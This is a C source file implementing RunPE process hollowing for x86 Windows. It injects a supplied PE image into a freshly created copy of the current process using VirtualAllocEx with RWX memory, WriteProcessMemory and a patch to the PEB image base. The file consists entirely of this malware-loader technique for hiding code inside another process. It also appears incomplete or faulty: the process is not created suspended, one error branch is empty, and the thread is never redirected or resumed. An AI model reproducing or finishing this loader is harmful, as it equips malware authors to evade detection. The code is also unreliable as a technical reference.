#include <Windows.h>
#include <winternl.h>

#include "x86-shellcode-runpe.h"

int
runpe(PBYTE* pe_image)
{
  int ret = 0;

  /*
    We purposely will not validate the PE image.
    This shellcode must be small and it *will* crash if given a wrong PE
    image.
  */

  PIMAGE_DOS_HEADER p_dos = (PIMAGE_DOS_HEADER)pe_image;
  PIMAGE_NT_HEADERS p_nt = (PIMAGE_NT_HEADERS)(pe_image + p_dos->e_lfanew);
  PIMAGE_SECTION_HEADER p_sections = IMAGE_FIRST_SECTION(p_nt);

  WCHAR cur_proc_path[MAX_PATH + 1];

  libc_memset(&cur_proc_path, 0, sizeof cur_proc_path);

  if (!GetModuleFileNameW(NULL, cur_proc_path, MAX_PATH)) {
    return -1;
  }

  PROCESS_INFORMATION proc_info;
  STARTUPINFOW start_info;

  libc_memset(&proc_info, 0, sizeof proc_info);
  libc_memset(&start_info, 0, sizeof start_info);

  start_info.cb = sizeof start_info;

  if (!CreateProcessW(cur_proc_path,
                      GetCommandLineW(),
                      NULL,
                      NULL,
                      FALSE,
                      0,
                      NULL,
                      NULL,
                      &start_info,
                      &proc_info)) {
    return -2;
  }

  PBYTE p_mapped = VirtualAllocEx(proc_info.hProcess,
                                  NULL,
                                  p_nt->OptionalHeader.SizeOfImage,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
  if (p_mapped == NULL) {
    ret = -3;
    goto kill_process;
  }

  if (!WriteProcessMemory(proc_info.hProcess,
                          p_mapped,
                          pe_image,
                          p_nt->OptionalHeader.SizeOfHeaders,
                          NULL)) {
    ret = -4;
    goto kill_process;
  }
  for (size_t i = 0; i < p_nt->FileHeader.NumberOfSections; ++i) {
    if (!WriteProcessMemory(proc_info.hProcess,
                            p_mapped + p_sections[i].VirtualAddress,
                            pe_image + p_sections[i].PointerToRawData,
                            p_sections[i].SizeOfRawData,
                            NULL)) {
      ret = -5;
      goto kill_process;
    }
  }

  CONTEXT thrd_ctx;
  libc_memset(&thrd_ctx, 0, sizeof thrd_ctx);

  thrd_ctx.ContextFlags = CONTEXT_FULL;

  if (!GetThreadContext(proc_info.hThread, &thrd_ctx)) {
    ret = -6;
    goto kill_process;
  }

  if (!WriteProcessMemory(proc_info.hProcess,
                          /*
                            Ebx is the foreign process PEB structure address.

                            We want to access the ImageBaseAddress field.
                            Before that field there is 3 BOOLEAN types,
                            a BOOLEAN sized union, and an HANDLE.

                            see: http://bytepointer.com/resources/tebpeb32.htm
                          */
                          thrd_ctx.Ebx + (sizeof(BOOLEAN) * 4 + sizeof(HANDLE)),
                          &p_mapped,
                          sizeof p_mapped,
                          NULL)) {
  }

  return 0;

kill_process:
  TerminateProcess(proc_info.hProcess, -1);
  CloseHandle(proc_info.hThread);
  CloseHandle(proc_info.hProcess);
  return ret;
}
